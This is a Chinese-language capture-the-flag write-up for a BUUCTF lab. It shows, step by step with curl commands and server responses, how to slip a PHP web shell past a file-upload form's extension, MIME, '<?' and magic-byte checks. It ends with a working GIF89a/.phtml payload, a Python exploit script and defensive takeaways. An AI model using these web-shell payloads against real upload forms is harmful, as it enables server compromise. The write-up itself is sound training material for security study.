---
title: 6-BUUCTF - 文件上传绕过实战 (上传头像) - DeepSeek WriteUp
date: 2026-05-02
categories:
  - BUUCTF
  - WEB
tags:
  - web
  - CTF
---

# BUUCTF - 文件上传绕过实战 (上传头像) - DeepSeek WriteUp

## 题目信息
- **目标地址**: `http://2428bd85-3ba8-4e37-ae0c-da50b037dab7.node5.buuoj.cn:81/`
- **Flag**: `flag{64baf9a6-fdcc-4338-805d-bea8f7ec68ba}`

## 题目分析

打开靶机，页面是一个"上传头像"(上传头像)的表单页面，提交到 `upload_file.php`。

通过逐步测试（每一步都伴随具体的 curl 命令和返回结果），发现服务器对上传文件做了多重过滤。

---

### 测试 1：直接上传 PHP 文件 → 发现扩展名检测

**测试命令：**
```bash
echo '<?php system("id"); ?>' > /tmp/test.php
curl -s -F "file=@/tmp/test.php" -F "submit=提交" \
  "http://2428bd85-3ba8-4e37-ae0c-da50b037dab7.node5.buuoj.cn:81/upload_file.php"
```

**返回结果：** `Not image!`

说明服务器在接收文件时首先检查了文件扩展名，只允许图片扩展名(gif/jpg/jpeg/png)通过。

只显示body标签的内容

```bash
curl -s -F "file=@./tmp/test.php" -F "submit=提交" http://2428bd85-3ba8-4e37-ae0c-da50b037dab7.node5.buuoj.cn:81/upload_file.php | sed -n '/<body>/,/<\/body>/p' | sed -e '1d;$d;s/<[^>]*>//g' | tr -d '[:space:]'
```



---

### 测试 2：对比不同扩展名，定位第一道防线 → 发现 MIME 类型检测

先试 `.phtml`：

```bash
echo '<?php system("id"); ?>' > /tmp/test.phtml
curl -s -F "file=@/tmp/test.phtml" -F "submit=提交" \
  "http://2428bd85-3ba8-4e37-ae0c-da50b037dab7.node5.buuoj.cn:81/upload_file.php"
```

**返回结果：** `Not image!`

再试 `.gif`：

```bash
echo '<?php system("id"); ?>' > /tmp/test.gif
curl -s -F "file=@/tmp/test.gif" -F "submit=提交" \
  "http://2428bd85-3ba8-4e37-ae0c-da50b037dab7.node5.buuoj.cn:81/upload_file.php"
```

**返回结果：** `NO! HACKER! your file included '<?'`

对比发现：
- `.phtml` → `Not image!`（第一关都没过）
- `.gif` → `NO! HACKER!`（过了第一关，被第二关拦住）

这说明第一道防线不止检查扩展名，还检查了 `$_FILES['file']['type']`（MIME 类型）。`.gif` 的默认 MIME 是 `image/gif` 所以通过；`.phtml` 的默认 MIME 不是图片类型所以被拦。

---

### 测试 3：绕过 MIME 类型，触发内容检测 → 发现 `<?` 过滤

**测试命令（`.phtml` + 显式 MIME 类型）：**
```bash
echo '<?php system("id"); ?>' > /tmp/test.phtml
curl -s -F "file=@/tmp/test.phtml;type=image/jpeg" -F "submit=提交" \
  "http://2428bd85-3ba8-4e37-ae0c-da50b037dab7.node5.buuoj.cn:81/upload_file.php"
```

**返回结果：** `NO! HACKER! your file included '<?'`

这次 `.phtml` + `type=image/jpeg` 通过了扩展名和 MIME 两道检查，进入了内容检测环节。服务器读取了文件内容，发现 `<?` 字符串就拦截了。

结论：后端使用 `file_get_contents()` 或类似方式读取文件内容并检测 `<?` 关键词。

---

### 测试 4：使用 `<script language="php">` 绕过 `<?` 过滤 → 发现 Magic Bytes 检测

**测试命令：**
```bash
echo '<script language="php">system("id");</script>' > /tmp/test.phtml
curl -s -F "file=@/tmp/test.phtml;type=image/jpeg" -F "submit=提交" \
  "http://2428bd85-3ba8-4e37-ae0c-da50b037dab7.node5.buuoj.cn:81/upload_file.php"
```

**返回结果：** `Don't lie to me, it's not image at all!!!`

终于没有触发 `<?` 过滤了，但出现了新的拦截。说明后端读取了文件头部字节来判断是否为有效图片格式（magic bytes 检测），当前文件没有合法的图片文件头所以被拒。

---

### 测试 5：最终绕过 — GIF89a + .phtml + MIME + script标签

**测试命令：**
```bash
echo 'GIF89a <script language="php">system("cat /flag*");</script>' > /tmp/shell.phtml
curl -s -F "file=@/tmp/shell.phtml;type=image/jpeg" -F "submit=提交" \
  "http://2428bd85-3ba8-4e37-ae0c-da50b037dab7.node5.buuoj.cn:81/upload_file.php"
```

**返回结果：** `上传文件名: shell.phtml`

四道防线全部绕过，文件上传成功。

### 额外步骤：定位上传目录

上传成功后需要知道文件被存到了哪个路径。通过枚举常见上传目录来定位：

```bash
for path in "test.gif" "uploads/test.gif" "upload/test.gif" "images/test.gif"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://2428bd85-3ba8-4e37-ae0c-da50b037dab7.node5.buuoj.cn:81/$path")
  echo "$path → HTTP $code"
done
```

输出：
```
test.gif → 404
uploads/test.gif → 404
upload/test.gif → 200
images/test.gif → 404
```

确认文件存储在 `/upload/` 目录下。

---

## 绕过条件汇总

实际绕过需要同时满足 **全部4项条件**，缺一不可：

| 检测层 | 触发条件 | 错误提示 | 绕过方式 |
|--------|---------|---------|---------|
| 扩展名 | 非图片扩展名(php/php5/phtml) | `Not image!` | 使用 `.phtml` 扩展名 |
| MIME 类型 | 未设置或非图片 MIME | `Not image!` | 设置 `type=image/jpeg` |
| 内容 `<?` | 文件内容包含 `<?` | `NO! HACKER! your file included '<?'` | 使用 `<script language="php">` |
| Magic Bytes | 文件头不是有效图片格式 | `Don't lie to me, it's not image at all!!!` | 文件头添加 `GIF89a` |

所有检测均通过后，返回 `上传文件名: xxx.phtml`。

## Exploit 过程

### 第一步：构造 Payload 并上传

```bash
# 构造包含命令执行的临时文件
echo 'GIF89a <script language="php">system("cat /flag*");</script>' > /tmp/shell.phtml

# 上传文件，显式指定 MIME type 为 image/jpeg
curl -s -F "file=@/tmp/shell.phtml;type=image/jpeg" -F "submit=提交" \
  "http://2428bd85-3ba8-4e37-ae0c-da50b037dab7.node5.buuoj.cn:81/upload_file.php"
```

上传成功返回：
```html
<strong>上传文件名: shell.phtml<br></strong>
```

### 第二步：访问 Webshell 获取 Flag

```bash
curl -s http://2428bd85-3ba8-4e37-ae0c-da50b037dab7.node5.buuoj.cn:81/upload/shell.phtml
```

返回结果：
```
GIF89a flag{64baf9a6-fdcc-4338-805d-bea8f7ec68ba}
```

## Python Exploit 版本

```python
import requests

url = "http://2428bd85-3ba8-4e37-ae0c-da50b037dab7.node5.buuoj.cn:81/upload_file.php"

payload = b'GIF89a <script language="php">system("cat /flag*");</script>'

files = {
    "file": ("shell.phtml", payload, "image/jpeg"),
    "submit": (None, "提交")
}

resp = requests.post(url, files=files)
print(resp.text)
```

## 相关知识点总结

### 1. MIME 校验的脆弱性
PHP 中 `$_FILES['file']['type']` 完全由客户端发送的 `Content-Type` 控制，无法作为安全校验依据。攻击者可随意修改。

### 2. 扩展名黑名单机制的缺陷
仅封禁常见的 `.php` 是不够的。攻击者可用以下扩展名绕过：
- `.phtml` — Apache 中默认可解析为 PHP
- `.php5`、`.php7` — 取决于服务器配置
- `.pht` — 某些配置中可解析

最佳实践：使用 **白名单机制**（仅允许 `.jpg`、`.png`、`.gif` 等）。

### 3. PHP 其他标签语法
PHP 支持多种标签形式，在 `<?` 被过滤时可用于绕过：

| 标签形式 | 是否可用 | 说明 |
|---------|---------|------|
| `<?php ?>` | 被过滤 | 标准标签，含 `<?` |
| `<? ?>` | 被过滤 | 短标签，含 `<?` |
| `<?= ?>` | 被过滤 | 短输出标签，含 `<?` |
| `<script language="php">` | **可用** | 已弃用，PHP 5.3 起弃用，PHP 7.0 移除 |
| `<% %>` | 不可用 | ASP 风格标签，需 `asp_tags=On` |

### 4. Magic Bytes 伪造
PHP 的 `exif_imagetype()` / `getimagesize()` 函数通过读取文件头的 magic bytes 判断文件类型。
常见图片文件头：

| 格式 | Magic Bytes |
|------|-------------|
| GIF  | `GIF89a` 或 `GIF87a` |
| JPEG | `\xFF\xD8\xFF` |
| PNG  | `\x89PNG` |

在最前面加上 `GIF89a` 即可绕过图像格式检测。

### 5. Nginx + Apache 反向代理架构
本靶机架构为 OpenResty(Nginx) 反代后端 Apache：
- Nginx 直接处理静态文件请求（返回 `Server: openresty`）
- PHP 动态请求转发给 Apache（返回 `Server: Apache/2.4.7 (Ubuntu)`）
- 404 页面由 Apache 返回，验证了后端是 Apache

## 参考
- PHP Manual: [PHP tags](https://www.php.net/manual/en/language.basic-syntax.phpmode.php)
- OWASP: [File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
